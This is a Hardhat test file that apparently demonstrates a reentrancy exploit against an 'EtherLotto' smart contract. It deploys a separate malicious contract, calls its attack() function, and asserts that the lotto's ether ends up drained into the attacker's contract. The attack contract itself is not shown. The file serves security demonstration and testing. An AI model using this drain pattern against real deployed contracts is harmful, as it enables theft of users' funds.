// test/EtherLotto.test.js

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("EtherLotto", function () {

  let deployer, attacker, user;
  let etherLotto, malicious;

  beforeEach(async function () {
    [deployer, attacker, user] = await ethers.getSigners();

    // Deploy the EtherLotto contract
    const EtherLotto = await ethers.getContractFactory("EtherLotto", deployer);
    etherLotto = await EtherLotto.deploy();
    await etherLotto.deployed();

    // Deploy the Malicious contract
    const MaliciousEtherLotto = await ethers.getContractFactory("MaliciousEtherLotto", attacker);
    malicious = await MaliciousEtherLotto.deploy(etherLotto.address);
    await malicious.deployed();

    // Deployer funds the EtherLotto contract
    await etherLotto.connect(user).play({ value: ethers.utils.parseEther("10") });
  });

  it("Should demonstrate reentrancy vulnerability", async function () {
    // Attacker initially plays the EtherLotto game
    await malicious.connect(attacker).attack({ value: ethers.utils.parseEther("10") });

    // Attacker executes the attack
    await malicious.connect(attacker).attack();

    // Checking the final balance of EtherLotto and Malicious contracts
    const finalEtherLottoBalance = await ethers.provider.getBalance(etherLotto.address);
    const finalMaliciousBalance = await ethers.provider.getBalance(malicious.address);

    // EtherLotto contract should be drained to 0
    expect(finalEtherLottoBalance).to.equal(0);

    // Malicious contract should have drained funds equivalent to initial deposit plus its own attack transfer
    expect(finalMaliciousBalance).to.be.above(ethers.utils.parseEther("10"));
  });
});